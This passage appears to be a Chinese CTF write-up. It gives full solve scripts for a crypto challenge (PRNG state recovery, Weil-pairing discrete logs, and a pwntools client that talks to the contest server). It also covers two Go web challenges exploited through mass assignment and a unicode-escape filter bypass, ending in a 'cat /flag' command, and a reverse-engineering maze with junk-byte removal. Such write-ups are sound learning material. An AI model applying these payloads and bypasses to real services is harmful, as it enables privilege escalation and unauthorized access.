  # decode flag chars    chars = []    for v in s_est:        cval = v % 200        try:            chars.append(chr(cval))        except Exception:            chars.append(&#x27;?&#x27;)    flag = &#x27;&#x27;.join(chars)    print(&quot;Recovered (first n) chars:&quot;)    print(flag)    r.close()if __name__ == &#x27;__main__&#x27;:    main()\n07-ECRSA玩上RSA杂交版了（笑）\nfrom Crypto.Util.number import *import osfrom sage.all import *import random as random2BANNER=&quot;&quot;&quot; ######  ##     ##  ######   ######  ######## ########     #######    #####    #######  ######## ##    ## ##     ## ##    ## ##    ##    ##    ##          ##     ##  ##   ##  ##     ## ##       ##       ##     ## ##       ##          ##    ##                 ## ##     ##        ## ##        ######  ##     ##  ######  ##          ##    ######       #######  ##     ##  #######  #######        ## ##     ##       ## ##          ##    ##          ##        ##     ## ##              ## ##    ## ##     ## ##    ## ##    ##    ##    ##          ##         ##   ##  ##        ##    ##  ######   #######   ######   ######     ##    ##          #########   #####   #########  ######  ######  ########  ##    ## ########  ########  #######     ######## ##    ## ##     ##  ##  ##  ##     ##    ##    ##     ##    ##    ## ##       ##     ##   ####   ##     ##    ##    ##     ##        ##   ##       ########     ##    ########     ##    ##     ##       ##    ##       ##   ##      ##    ##           ##    ##     ##      ##     ##    ## ##    ##     ##    ##           ##    ##     ##      ##      ######  ##     ##    ##    ##           ##     #######       ##     &quot;&quot;&quot;print(BANNER)globalPrime=26959946667150639794667015087019630673637144422540572481103610249153def GetFlag():    flag=os.getenv(&#x27;GZCTF_FLAG&#x27;).encode()    upperBoundPrime=2**1280-2**512+2**128-2**40-2**16-8+1    p=previous_prime(random2.randint(0,upperBoundPrime))    q=next_prime(random2.randint(0,upperBoundPrime))    e=1435756429    n=p*q    c=pow(bytes_to_long(flag),e,n)    print(f&#x27;N=&#123;n&#125;&#x27;)    print(f&#x27;e=&#123;e&#125;&#x27;)    print(f&#x27;c=&#123;c&#125;&#x27;)    print(f&#x27;hint=&#123;q&gt;&gt;960&#125;&#x27;)def Chall():    p=int(input(&#x27;Give me your prime&gt;&#x27;))    if(p.bit_length()&lt;226 or p.bit_length()&gt;333 or not isPrime(p)):        print(&#x27;Invaid prime!&#x27;)        exit(1)    a,b=[int(i)%p for i in input(&#x27;Give me your parameters&gt;&#x27;).split()]    assert a**2+b**2    v=2    while(pow(v,p&gt;&gt;1,p)==1):        v+=1    Fq2=GF((p,2),modulus=[-v,0,1],name=&#x27;sqv&#x27;)    E=EllipticCurve(Fq2,[a,b])    x1,x2=[Zmod(p)(i) for i in input(&#x27;Give me 2 base points(x_coordinate)&gt;&#x27;).split()]    G1=E.lift_x(x1)    G2=E.lift_x(x2)    assert G1.order()==G2.order()    orderG=G1.order()    def ListG(Gx):        Gxy=Gx.xy()        r=[]        r=list(Gxy[0])+list(Gxy[1])        return tuple(r)    print(f&#x27;Your Point G1: &#123;ListG(G1)&#125;&#x27;)    print(f&#x27;Your Point G2: &#123;ListG(G2)&#125;&#x27;)    for i in range(44):        u,v=random2.randint(0,globalPrime),random2.randint(0,globalPrime)        print(f&#x27;Your Point:&#123;ListG(u*G1+v*G2)&#125;&#x27;)        u1,v1=[int(i) for i in input(&#x27;Give me your answer Result&gt;&#x27;).split()]        assert u1==u and v1==vfor _ in range(2):    op=int(input(&#x27;Give me your option&gt;&#x27;))    if(op==1):        GetFlag()    elif(op==2):        Chall()    else:        exit(0)\n我们一共只有两次交互机会，选两次1也没有办法攻破RSA，模数完全不一样，因此必须是一个1一个2。虽然2看起来其实没有什么用，flag信息全在1的加密中，但是给出的hint太少了，p和q都是约1280位质数，但仅给出了q的高1280-960=320位，不足以使用coppersmith方法（至少要q的一半高位），还差320位也远远超过可以爆破的范围，看来我们还是得利用2。\n2与1的共通点只有使用了random库生成的随机数，看来只能从这里入手，python的random库使用了mt19937生成伪随机数，因此我们可以收集连续的一些生成值，还原整个随机数发生器，这样就可以得到任何随机数了。想要复原mt19937，我们需要624个32位整数（状态）。\n借助ChatGPT惊人的注意力，globalPrime=26959946667150639794667015087019630673637144422540572481103610249153实际上是$2^{224}-63$，因此random.randint基本上返回一个224bit的值，也就是7个32bit数。完成挑战一共是44组，每组两个数，共88个224bit数，也就是$88\\times7=616$个32bit数，距离我们的624还差256bit，这部分依靠hint。\n由于我们需要连续的随机数，如果先GetFlag再Chall，那么剩下这256bit就是q的低位，而低位我们不好找，于是先Chall再GetFlag，这样我们只需要得到p的高256bit就能攻破随机数生成器了。\n题目给出了q的高320位，由于q和random生成的随机数相差不大，高320位可以认为就是原始的随机数，由$n=pq$可以得到p的高位，虽然由于进位等原因，可信的位数不足320位，但256位还是绰绰有余。这样我们就还原了随机数发生器，可以自己生成p和q了。\n那么，接下来的问题是Chall挑战。我们可以自选226到333位的质数$p$，并自选圆锥曲线的参数$a$和$b$，在模$p^2$的群下构建椭圆曲线$y^2=x^3+ax+b$，再自选两个阶相同的基点，开始挑战。伟大的Gemini告诉我应该采用配对攻击，选择超奇异曲线$y^2=x^3+x$，再选两个线性无关的点，利用Weil-Pairing的双线性性质。\n我们已知$P=uG_1+vG_2$，且$G_1，G_2$阶相同，需要求出$u,v$，对$P$和$G_1$做配对，$e(P,G_1)=e(uG_1+vG_2,G_1)=e(G_1,G_1)^u\\cdot e(G_2,G_1)^v=e(G_2,G_1)^v$。\n其中所有的点我们都已知，因此可以计算出$e(P,G_1)$和$e(G_2,G_1)$，这就是一个标准的离散对数问题，解出它就能求解$v$。对于u，我们将$P$和$G_2$配对，方法一致。这样我们就有了两个离散对数，其中阶为$p+1$，我们只需要让$p+1$可以分解为只有小素数即可。我原先使用的代码长这样：\nfrom functools import reducefrom Crypto.Util.number import getPrime, isPrimewhile True:    p = reduce(lambda x,y: x*y, [getPrime(10) for _ in range(25)])*4 - 1    if(p%4 == 3 and isPrime(p)):        print(p)        break#p=5143204670319561596213349668594160691006857613681759905713565676116637627\n后来跟别的师傅一交流，10位的质数还是太大了，大家都是用2的若干次方乘3的若干次方减1。又学到一招。\n另一个问题是我怎么找两个x，让他们的阶一样，且不是线性相关。于是我拜托Gemini写了另一份脚本。\nfrom sage.all import *import randomimport time# ================== 请在这里替换成题目给的 p, a, b ==================p = 5143204670319561596213349668594160691006857613681759905713565676116637627a = 1b = 0# =================================================================# 搜索参数（可调整）MAX_TRIALS = 3000      # 最多尝试多少个 xUSE_RANDOM = False      # True: 随机采样 x；False: 顺序从 2 开始VERBOSE = Truedef info(*args, **kwargs):    if VERBOSE:        print(*args, **kwargs)# 找一个二次非剩余 v（与服务器一致的寻找方法）v_val = 2while pow(v_val, (p - 1) // 2, p) == 1:    v_val += 1info(&quot;[info] chosen v =&quot;, v_val, &quot;p bitlen =&quot;, p.bit_length())# 构造 F_p^2 与曲线Fp2 = GF((p,2), name=&#x27;z&#x27;, modulus=[-v_val,0,1])z = Fp2.gen()E = EllipticCurve(Fp2, [a, b])info(&quot;[info] Elliptic curve constructed.&quot;)# 用来保存同阶的点: dict: order -&gt; list of (x_int, Point)same_order = &#123;&#125;tried = set()start = time.time()trials = 0while trials &lt; MAX_TRIALS:    trials += 1    x_int = trials + 2    tried.add(x_int)    # 把 x 放入 Fp2（作为基域元素嵌入）    x_fp2 = Fp2(x_int)    # 尝试 lift_x    try:        G = E.lift_x(x_fp2)    except Exception as e:        # x 不能被 lift（没有对应的 y），跳过        if VERBOSE:            print(f&quot;[trial &#123;trials&#125;] x=&#123;x_int&#125; : lift_x failed (&#123;e&#125;)&quot;)        continue    # 检查是否为无穷远或单位点    if G.is_zero():        if VERBOSE:            print(f&quot;[trial &#123;trials&#125;] x=&#123;x_int&#125; : point is zero&quot;)        continue    # 计算阶    try:        ordG = Integer(G.order())    except Exception as e:        print(f&quot;[trial &#123;trials&#125;] x=&#123;x_int&#125; : computing order failed: &#123;e&#125;&quot;)        continue    if ordG &lt;= 1:        if VERBOSE:            print(f&quot;[trial &#123;trials&#125;] x=&#123;x_int&#125; : trivial order &#123;ordG&#125;, skip&quot;)        continue    info(f&quot;[trial &#123;trials&#125;] x=&#123;x_int&#125; -&gt; order = &#123;ordG&#125;&quot;)    # 存入字典    lst = same_order.get(ordG, [])    lst.append((x_int, G))    same_order[ordG] = lst    # 如果有至少两点，检查配对是否非平凡    if len(same_order[ordG]) &gt;= 2:        # 遍历该阶下的所有点对        for i in range(len(same_order[ordG])):            for j in range(i+1, len(same_order[ordG])):                x1, G1 = same_order[ordG][i]                x2, G2 = same_order[ordG][j]                # 计算 Weil pairing (用该阶 ordG)                try:                    e21 = G2.weil_pairing(G1, ordG)                except Exception as e:                    print(f&quot;[trial &#123;trials&#125;] pairing failed for ord &#123;ordG&#125;: &#123;e&#125;&quot;)                    continue                info(f&quot;  testing pair x1=&#123;x1&#125;, x2=&#123;x2&#125;, e(G2,G1)=&#123;e21&#125;&quot;)                if e21 != 1:                    elapsed = time.time() - start                    print(&quot;=== FOUND ===&quot;)                    print(&quot;x1 =&quot;, x1)                    print(&quot;x2 =&quot;, x2)                    print(&quot;order =&quot;, ordG)                    print(&quot;e(G2,G1) =&quot;, e21)                    print(f&quot;trials = &#123;trials&#125;, elapsed = &#123;elapsed:.2f&#125;s&quot;)                    raise SystemExit(0)&#x27;&#x27;&#x27;=== FOUND ===x1 = 3x2 = 4order = 1285801167579890399053337417148540172751714403420439976428391419029159407e(G2,G1) = 1147091865358558230580726329472507206030651293267131266460286299834598687*z + 3208661019248159787151861860459623458845339463259508253495498454434988461trials = 2, elapsed = 0.34s&#x27;&#x27;&#x27;\n很幸运在我找的p下，x=3和4就是一组同阶且不线性相关的点对，于是最后的交互代码如下。\nfrom sage.all import *from pwn import *import reimport sysr = remote(&#x27;106.14.191.23&#x27;, 56876)def recv_ints_from_line(byte_pat):    line = r.recvline_contains(byte_pat).decode().strip()    nums = re.findall(r&#x27;-?\\d+&#x27;, line)    return [int(x) for x in nums]def send_and_recv_prompt(prompt, data):    r.sendlineafter(prompt, data)def reconstruct_fp2_element(Fp2, coeffs):    # coeffs: [c0, c1]  (c0 + c1 * gen)    return Fp2(int(coeffs[0])) + Fp2.gen() * Fp2(int(coeffs[1]))def solve_chall():    uv = []    p = 5143204670319561596213349668594160691006857613681759905713565676116637627    # send parameters a b    a = 1    b = 0    # choose two x coords    x1 = 3    x2 = 4    log.info(&quot;Choosing option 2: Chall&quot;)    r.sendlineafter(b&#x27;Give me your option&gt;&#x27;, b&#x27;2&#x27;)    log.info(f&quot;Sending prime p = &#123;p&#125;&quot;)    r.sendlineafter(b&#x27;Give me your prime&gt;&#x27;, str(p).encode())    log.info(f&quot;Sending parameters a=&#123;a&#125;, b=&#123;b&#125;&quot;)    r.sendlineafter(b&#x27;Give me your parameters&gt;&#x27;, f&#x27;&#123;a&#125; &#123;b&#125;&#x27;.encode())    log.info(f&quot;Sending base points x1=&#123;x1&#125;, x2=&#123;x2&#125;&quot;)    r.sendlineafter(b&#x27;Give me 2 base points(x_coordinate)&gt;&#x27;, f&#x27;&#123;x1&#125; &#123;x2&#125;&#x27;.encode())    # === 接收并解析服务器返回的基点 ===    line_g1 = r.recvline_contains(b&#x27;Your Point G1:&#x27;).decode()    G1_coords_str = line_g1.split(&#x27;:&#x27;, 1)[1].strip()    line_g2 = r.recvline_contains(b&#x27;Your Point G2:&#x27;).decode()    G2_coords_str = line_g2.split(&#x27;:&#x27;, 1)[1].strip()        G1_nums = [int(i) for i in G1_coords_str.strip()[1:-1].split(&#x27;, &#x27;)]    G2_nums= [int(i) for i in G2_coords_str.strip()[1:-1].split(&#x27;, &#x27;)]    # reconstruct Fp2 and curve    # find same v as server (smallest v with Legendre symbol -1)    v_server = 2    while pow(v_server, (p - 1) // 2, p) == 1:        v_server += 1    Fp2 = GF((p,2), name=&#x27;z&#x27;, modulus=[-v_server, 0, 1])    E = EllipticCurve(Fp2, [a, b])    # reconstruct G1, G2    g1x = reconstruct_fp2_element(Fp2, [G1_nums[0], G1_nums[1]])    g1y = reconstruct_fp2_element(Fp2, [G1_nums[2], G1_nums[3]])    G1 = E(g1x, g1y)    g2x = reconstruct_fp2_element(Fp2, [G2_nums[0], G2_nums[1]])    g2y = reconstruct_fp2_element(Fp2, [G2_nums[2], G2_nums[3]])    G2 = E(g2x, g2y)    orderG = Integer(G1.order())    log.info(f&quot;Order of G: &#123;orderG&#125;&quot;)    # precompute pairings of base points if needed    base_e21 = G2.weil_pairing(G1, orderG)  # e(G2, G1)    base_e12 = G1.weil_pairing(G2, orderG)  # e(G1, G2) (should be inverse if skew-symmetric)    # 44 rounds    for i in range(44):        P_nums = recv_ints_from_line(b&#x27;Your Point:&#x27;)        if len(P_nums) &lt; 4:            print(&quot;Can&#x27;t parse P&quot;)            return        px = reconstruct_fp2_element(Fp2, [P_nums[0], P_nums[1]])        py = reconstruct_fp2_element(Fp2, [P_nums[2], P_nums[3]])        P = E(px, py)        # compute pairings        alpha = P.weil_pairing(G1, orderG)   # = e(P, G1) = e(G2,G1)^v        beta  = base_e21                     # = e(G2,G1)        gamma = P.weil_pairing(G2, orderG)   # = e(P,G2) = e(G1,G2)^u        delta = base_e12                     # = e(G1,G2)        v_sol = discrete_log(alpha, beta, ord=orderG)        u_sol = discrete_log(gamma, delta, ord=orderG)        r.sendlineafter(b&#x27;Give me your answer Result&gt;&#x27;, f&#x27;&#123;int(u_sol)&#125; &#123;int(v_sol)&#125;&#x27;.encode())        uv.append(u_sol)        uv.append(v_sol)    print(&quot;Done&quot;)    print(uv)    r.interactive()if __name__ == &#x27;__main__&#x27;:    solve_chall()\n这样就得到了所有的u和v，它们组成了一个列表。而在r.interactive()之后，还需要输入1获取n，e，c和hint。\n确定p的高位的方法是：将hint后面补960个0，和hint后面补960个1，分别用n去除它，会得到p的上界和下界，高位的共通部分约为300位，取最高的256位。\n# 将下面的 N_str 与 qh_str 替换为给定的字符串N_str = &quot;106897429131436433939432912232276233296311876951532001123022382654864722947479670691716832533065551314863759684315253251060657681449987001046824319332752747575149259813569751774809904578140218190142084770417026385676156279911248125384075166924986815698053727836585266634861036806610757625661750087036487582812084202599896118909344304202288362656690252059501639547661050581185671640360702353386468101709512990874181857424903319023494387842239621022113621194024582236546465182006221753466985945737370226613429335307234674303583652412436928398230621279142253903936164694090000099046583773588189519968922110944689888964198066676720598220406318844002758600075929920216302483852562277187528679602845952613336071175591330954339185879800089600441519691730600437881852821751423549&quot;qh_str = &quot;727261448275186783330537485153166497571240820998172969989601692945381865374269973262457015915319&quot;N = int(N_str)qh = int(qh_str)Q = qh &lt;&lt; 960p_min = N // (Q + (1 &lt;&lt; 960) - 1)p_max = N // Q# 计算共同最高位数x = p_min ^ p_maxcommon_prefix_bits = p_max.bit_length() - x.bit_length()# 取出最高 320 位与最高 256 位（作为整数）bitlen = p_max.bit_length()   # 应该为 1280p_top320 = p_max &gt;&gt; (bitlen - 320)p_top256 = p_max &gt;&gt; (bitlen - 256)print(&quot;common_prefix_bits =&quot;, common_prefix_bits)print(&quot;p_top320 =&quot;, p_top320)print(&quot;p_top256 =&quot;, p_top256)#实际上共同的位数有316位，取出256位后为83900644468400484600848154534507404984521324413319865465147839187423941603919\n因此我们有了mt19937整个状态，用randcrack就可以还原。在越过1280-256位的p后，我们得到了1280位的q。\nimport randcrackfrom gmpy2 import next_primeuvlist = […]# 最后的256位数字extra_256bit_num = 83900644468400484600848154534507404984521324413319865465147839187423941603919def submit_large_number(cracker, large_num, total_bits):    &quot;&quot;&quot;    将一个大整数拆分成多个32位块，并按正确的顺序提交给cracker。    :param cracker: randcrack.RandCrack 实例    :param large_num: 要拆分的大整数    :param total_bits: 大整数的总位数 (必须是32的倍数)    &quot;&quot;&quot;    if total_bits % 32 != 0:        raise ValueError(&quot;总位数必须是32的倍数&quot;)    num_chunks = total_bits // 32    # 从低位到高位依次提取32位块    # 这对应了 getrandbits 的拼接顺序    for i in range(num_chunks):        # 通过右移和掩码操作提取第 i 个32位块        chunk = (large_num &gt;&gt; (i * 32)) &amp; 0xFFFFFFFF        cracker.submit(chunk)# --- 主执行逻辑 ---if len(uvlist) != 88:    print(f&quot;错误：uvlist 应该包含88个数字，但实际有 &#123;len(uvlist)&#125; 个。&quot;)else:    # 1. 初始化 RandCrack    cracker = randcrack.RandCrack()    print(&quot;RandCrack实例已创建。开始提交数据...&quot;)    # 2. 按顺序处理 uvlist 中的88个224位数    print(f&quot;正在处理 &#123;len(uvlist)&#125; 个224位数...&quot;)    for i, num in enumerate(uvlist):        submit_large_number(cracker, num, 224)    print(&quot;所有224位数提交完毕。&quot;)    # 3. 处理最后的256位数    print(&quot;正在处理最后的256位数...&quot;)    submit_large_number(cracker, extra_256bit_num, 256)    print(&quot;256位数提交完毕。&quot;)    print(&quot;\\n========================================================&quot;)    print(&quot;🎉 成功！所有数据已按正确顺序提交。&quot;)    print(&quot;cracker 实例现在已与服务器的PRNG状态同步。&quot;)    print(&quot;========================================================&quot;)    # 4. 现在你可以用它来预测了    # 例如，在越过剩余的p之后，预测getFlag部分生成的第一个1280位的随机数(q)    total_bits_to_predict = 1280-256    num_chunks_to_predict = total_bits_to_predict // 32    predicted_large_num = 0    for i in range(num_chunks_to_predict):        predicted_chunk = cracker.predict_getrandbits(32)        predicted_large_num |= (predicted_chunk &lt;&lt; (i * 32))    total_bits_to_predict = 1280    num_chunks_to_predict = total_bits_to_predict // 32    predicted_large_num = 0    for i in range(num_chunks_to_predict):        predicted_chunk = cracker.predict_getrandbits(32)        predicted_large_num |= (predicted_chunk &lt;&lt; (i * 32))    print(f&quot;\\n预测的下一个1280位随机数是:\\n&#123;predicted_large_num&#125;&quot;)    print(f&#x27;因此，计算出的q是&#123;next_prime(predicted_large_num)&#125;&#x27;)\n附录出这道题的师傅还有高招……由于mt19937在产生随机数的时候，只使用了三个内部状态，亦即：\nx_{k+624}=x_{k+397} \\oplus ((x_k^u∣x_{k+1}^l)A)因此，在生成新的状态时，我们即使没有完整的624个32bit数，依然能够还原相近的一部分正确状态。假设我们的uv列表提供了第0个状态到第615个状态，那么，虽然我们不知道第616到623个状态，但是，第624个状态根据公式，是可以确定的。一直递推，直到第218+624个状态都可以确定，每个状态32位，这已经远远超出了1280位的$p$或者$q$。因此，即使最后8个state全填0，这个问题依然可以求解。感谢仁慈的师傅呜呜呜。\nWebweb不是我的方向，不过看到了有两题很多人出了，估计是签到题，简单AI一下就结束（\nam i admin?package mainimport (\t&quot;log&quot;\t&quot;net/http&quot;)const PORT_STR = &quot;:8080&quot;func main() &#123;\tadminPassword := GenRandomSeq(16)\tlog.Printf(&quot;Admin password: %s\\n&quot;, adminPassword)\tadminUserCreds := UserCreds&#123;\t\tUsername: &quot;admin&quot;,\t\tPassword: adminPassword,\t\tIsAdmin:  true,\t&#125;\tstore := NewSessionStore()\tuserDB := NewUserDB()\tuserDB.Lock()\tuserDB.users[&quot;admin&quot;] = adminUserCreds\tuserDB.Unlock()\tauth := &amp;Auth&#123;\t\tAdminPassword: adminPassword,\t\tStore:         store,\t\tUserDB:        userDB,\t&#125;\thttp.HandleFunc(&quot;/register&quot;, auth.RegisterHandler)\thttp.HandleFunc(&quot;/login&quot;, auth.LoginHandler)\thttp.HandleFunc(&quot;/logout&quot;, auth.LogoutHandler)\thttp.HandleFunc(&quot;/run&quot;, auth.RequireAdmin(RunCommandHandler))\tlog.Printf(&quot;Server running on %s\\n&quot;, PORT_STR)\tlog.Fatal(http.ListenAndServe(PORT_STR, nil))&#125;\nmain函数提供了注册、登录、登出和执行命令的功能，其中/run必须是管理员才可以执行。管理员信息存储在UserCreds的IsAdmin项。\npackage mainimport (\t&quot;encoding/json&quot;\t&quot;fmt&quot;\t&quot;net/http&quot;\t&quot;sync&quot;)type UserCreds struct &#123;\tUsername string `json:&quot;username&quot;`\tPassword string `json:&quot;password&quot;`\tIsAdmin  bool&#125;type SessionStore struct &#123;\tsync.Mutex\tsessions map[string]UserCreds // sessionID -&gt; UserCreds&#125;func NewSessionStore() *SessionStore &#123;\treturn &amp;SessionStore&#123;sessions: make(map[string]UserCreds)&#125;&#125;type UserDB struct &#123;\tsync.Mutex\tusers map[string]UserCreds // username -&gt; creds&#125;func NewUserDB() *UserDB &#123;\treturn &amp;UserDB&#123;users: make(map[string]UserCreds)&#125;&#125;type Auth struct &#123;\tAdminPassword string\tStore         *SessionStore\tUserDB        *UserDB&#125;func (a *Auth) RegisterHandler(w http.ResponseWriter, r *http.Request) &#123;\tvar c UserCreds\tjson.NewDecoder(r.Body).Decode(&amp;c)\tif c.Username == &quot;&quot; || c.Password == &quot;&quot; &#123;\t\thttp.Error(w, &quot;username and password required&quot;, http.StatusBadRequest)\t\treturn\t&#125;\tif c.Username == &quot;admin&quot; &#123;\t\thttp.Error(w, &quot;cannot register as admin&quot;, http.StatusForbidden)\t\treturn\t&#125;\ta.UserDB.Lock()\tdefer a.UserDB.Unlock()\tif _, exists := a.UserDB.users[c.Username]; exists &#123;\t\thttp.Error(w, &quot;username already exists&quot;, http.StatusConflict)\t\treturn\t&#125;\ta.UserDB.users[c.Username] = c\tw.Write([]byte(&quot;register success&quot;))&#125;func (a *Auth) LoginHandler(w http.ResponseWriter, r *http.Request) &#123;\tvar c UserCreds\tjson.NewDecoder(r.Body).Decode(&amp;c)\ta.UserDB.Lock()\tuser, ok := a.UserDB.users[c.Username]\ta.UserDB.Unlock()\tif ok &amp;&amp; user.Password == c.Password &#123;\t\tif user.Username == &quot;admin&quot; &amp;&amp; user.Password == a.AdminPassword &#123;\t\t\tuser.IsAdmin = true\t\t&#125;\t\tsessionID := GenRandomSeq(32)\t\ta.Store.Lock()\t\ta.Store.sessions[sessionID] = user\t\ta.Store.Unlock()\t\thttp.SetCookie(w, &amp;http.Cookie&#123;Name: &quot;session_id&quot;, Value: sessionID, Path: &quot;/&quot;&#125;)\t\tfmt.Fprintf(w, &quot;user %s logged in&quot;, user.Username)\t\treturn\t&#125;\thttp.Error(w, &quot;invalid credentials&quot;, http.StatusUnauthorized)&#125;func (a *Auth) LogoutHandler(w http.ResponseWriter, r *http.Request) &#123;\tcookie, err := r.Cookie(&quot;session_id&quot;)\tif err != nil &#123;\t\thttp.Error(w, &quot;no session, are you logged in?&quot;, http.StatusInternalServerError)\t\treturn\t&#125;\ta.Store.Lock()\tdelete(a.Store.sessions, cookie.Value)\ta.Store.Unlock()\tw.Write([]byte(&quot;user logged out&quot;))&#125;func (a *Auth) RequireAdmin(next http.HandlerFunc) http.HandlerFunc &#123;\treturn func(w http.ResponseWriter, r *http.Request) &#123;\t\tcookie, err := r.Cookie(&quot;session_id&quot;)\t\tif err != nil &#123;\t\t\thttp.Error(w, &quot;not logged in&quot;, http.StatusUnauthorized)\t\t\treturn\t\t&#125;\t\ta.Store.Lock()\t\tuser, ok := a.Store.sessions[cookie.Value]\t\ta.Store.Unlock()\t\tif !ok || !user.IsAdmin &#123;\t\t\thttp.Error(w, &quot;admin only&quot;, http.StatusForbidden)\t\t\treturn\t\t&#125;\t\tnext(w, r)\t&#125;&#125;\nauth.go中提供了注册、登录登出和管理员权限验证功能，但是，注册的方法只拒绝用户注册为admin，用户可以自己把权限写进json。\n因此我们可以POST&#123;&quot;username&quot;:&quot;attacker&quot;, &quot;password&quot;:&quot;pwn&quot;, &quot;IsAdmin&quot; :true&#125;，服务器就会将Isadmin也保存，登录访问run即可。\n登录：POST&#123;&quot;username&quot;:&quot;attacker&quot;, &quot;password&quot;:&quot;pwn&quot;&#125;\n执行命令：POST&#123;&quot;cmd&quot;:&quot;cat&quot;, &quot;args&quot;:[&quot;/flag&quot;]&#125;\nam i admin? 2package mainimport (\t&quot;encoding/json&quot;\t&quot;fmt&quot;\t&quot;io&quot;\t&quot;net/http&quot;\t&quot;strings&quot;\t&quot;sync&quot;)type UserCreds struct &#123;\tUsername string `json:&quot;username&quot;`\tPassword string `json:&quot;password&quot;`\tIsAdmin  bool&#125;type SessionStore struct &#123;\tsync.Mutex\tsessions map[string]UserCreds // sessionID -&gt; UserCreds&#125;func NewSessionStore() *SessionStore &#123;\treturn &amp;SessionStore&#123;sessions: make(map[string]UserCreds)&#125;&#125;type UserDB struct &#123;\tsync.Mutex\tusers map[string]UserCreds // username -&gt; creds&#125;func NewUserDB() *UserDB &#123;\treturn &amp;UserDB&#123;users: make(map[string]UserCreds)&#125;&#125;type Auth struct &#123;\tAdminPassword string\tStore         *SessionStore\tUserDB        *UserDB&#125;func (a *Auth) RegisterHandler(w http.ResponseWriter, r *http.Request) &#123;\tbody, _ := io.ReadAll(r.Body)\tbodyStr := string(body)\tif strings.Contains(bodyStr, &quot;IsAdmin&quot;) &#123;\t\thttp.Error(w, &quot;not allowed!&quot;, http.StatusForbidden)\t\treturn\t&#125;\tvar c UserCreds\tjson.Unmarshal(body, &amp;c)\tif c.Username == &quot;&quot; || c.Password == &quot;&quot; &#123;\t\thttp.Error(w, &quot;username and password required&quot;, http.StatusBadRequest)\t\treturn\t&#125;\tif c.Username == &quot;admin&quot; &#123;\t\thttp.Error(w, &quot;cannot register as admin&quot;, http.StatusForbidden)\t\treturn\t&#125;\ta.UserDB.Lock()\tdefer a.UserDB.Unlock()\tif _, exists := a.UserDB.users[c.Username]; exists &#123;\t\thttp.Error(w, &quot;username already exists&quot;, http.StatusConflict)\t\treturn\t&#125;\ta.UserDB.users[c.Username] = c\tw.Write([]byte(&quot;register success&quot;))&#125;func (a *Auth) LoginHandler(w http.ResponseWriter, r *http.Request) &#123;\tbody, _ := io.ReadAll(r.Body)\tbodyStr := string(body)\tif strings.Contains(bodyStr, &quot;IsAdmin&quot;) &#123;\t\thttp.Error(w, &quot;not allowed!&quot;, http.StatusForbidden)\t\treturn\t&#125;\tvar c UserCreds\tjson.Unmarshal(body, &amp;c)\ta.UserDB.Lock()\tuser, ok := a.UserDB.users[c.Username]\ta.UserDB.Unlock()\tif ok &amp;&amp; user.Password == c.Password &#123;\t\tif user.Username == &quot;admin&quot; &amp;&amp; user.Password == a.AdminPassword &#123;\t\t\tuser.IsAdmin = true\t\t&#125;\t\tsessionID := GenRandomSeq(32)\t\ta.Store.Lock()\t\ta.Store.sessions[sessionID] = user\t\ta.Store.Unlock()\t\thttp.SetCookie(w, &amp;http.Cookie&#123;Name: &quot;session_id&quot;, Value: sessionID, Path: &quot;/&quot;&#125;)\t\tfmt.Fprintf(w, &quot;user %s logged in&quot;, user.Username)\t\treturn\t&#125;\thttp.Error(w, &quot;invalid credentials&quot;, http.StatusUnauthorized)&#125;func (a *Auth) LogoutHandler(w http.ResponseWriter, r *http.Request) &#123;\tcookie, err := r.Cookie(&quot;session_id&quot;)\tif err != nil &#123;\t\thttp.Error(w, &quot;no session, are you logged in?&quot;, http.StatusInternalServerError)\t\treturn\t&#125;\ta.Store.Lock()\tdelete(a.Store.sessions, cookie.Value)\ta.Store.Unlock()\tw.Write([]byte(&quot;user logged out&quot;))&#125;func (a *Auth) RequireAdmin(next http.HandlerFunc) http.HandlerFunc &#123;\treturn func(w http.ResponseWriter, r *http.Request) &#123;\t\tcookie, err := r.Cookie(&quot;session_id&quot;)\t\tif err != nil &#123;\t\t\thttp.Error(w, &quot;not logged in&quot;, http.StatusUnauthorized)\t\t\treturn\t\t&#125;\t\ta.Store.Lock()\t\tuser, ok := a.Store.sessions[cookie.Value]\t\ta.Store.Unlock()\t\tif !ok || !user.IsAdmin &#123;\t\t\thttp.Error(w, &quot;admin only&quot;, http.StatusForbidden)\t\t\treturn\t\t&#125;\t\tnext(w, r)\t&#125;&#125;\n与前一题的区别在于现在传上去的json串如果包含IsAdmin就会被拒绝了，但是可以用unicode转义绕过去，其他的同上。\n注册时使用 POST&#123;&quot;username&quot;:&quot;attacker&quot;, &quot;password&quot;:&quot;pwn&quot;, &quot;IsAd\\u006din&quot; :true&#125;\n\n如果你继续阅读上面那篇文章的话，会惊讶（真的吗）地发现 encoding/json 默认是大小写不敏感的：所以我们随便改个大小写就能绕过检查。——官方wp\n\nReverseezsignin简单签到，玩一下，看起来是迷宫。\n搜索字符串，搜到了，怎么没有引用(Xref)？那我怎么找main函数？\n\n\n随便看看代码段(.text)发现不对劲，有花指令，loc_1A65上一行跳转到这行指令中间了。\n\n按U将代码还原为字节，改掉头两个，再按C将剩余部分识别为代码，这下看起来正常多了。\n\n上面还有若干花指令，同样去除，保存到源文件中，再次打开就会发现字符串都有引用了，我们可以据此找到main函数是sub_17A2。\n\n进入main函数，函数逻辑比较清楚，第一关是走迷宫，其中1，2，3，4分别对应右下左上。迷宫是E1110000010000010001110001000001111O，可以猜测E和O分别是起点和终点。每走一步都会判断会不会撞墙，墙用&#39;0&#39;(48)表示。\n\n给迷宫分一下块，从代码可以看出是每6个字符为一行，或者因为一共是36个字符，猜也得猜是个方形。\nE11100            路径：1112223322111100010000010001110001000001111O\n输入后进入第二关，第二关会根据刚才的输入进行不同的加密，加密后和固定的密文比较，因此我们需要反过来解密。\n密文：2wHFw6XRQFJexwYcizWFJVU87GnPPbuRZF99t8884SxTeRptgvAmfzdqmE9skCSRbEMUc8r5WcGQ4aq8gJQ2fpUQgiiNvkEQXL4GoQ5rBZfejYFtEpTA5x1kybteneAuECqp3uLCDnuU4GwD1kKet8Bmqb4eidPWEcr6bSNNU3wr5xxtHpc43TyHMSKggBRZr\n解密顺序：11112233222111\n\n很幸运的是没有4，我们可以少分析一个函数，其实4是异或一个随机数，用了就还原不了了（）\n//case &#x27;1&#x27;int __cdecl sub_148D(int a1)&#123;  int result; // eax  int v2; // [esp+8h] [ebp-8h]  int i; // [esp+Ch] [ebp-4h]  v2 = sub_1337(a1);  for ( i = 0; ; ++i )  &#123;    result = i;    if ( i &gt;= v2 )      break;    *(_BYTE *)(i + a1) ^= 0x66u;  &#125;  return result;&#125;\na1是传入的字符串指针，直接就是每一位异或0x66。\nvoid __cdecl sub_14EB(void *src)&#123;  int v1; // eax  int v2; // eax 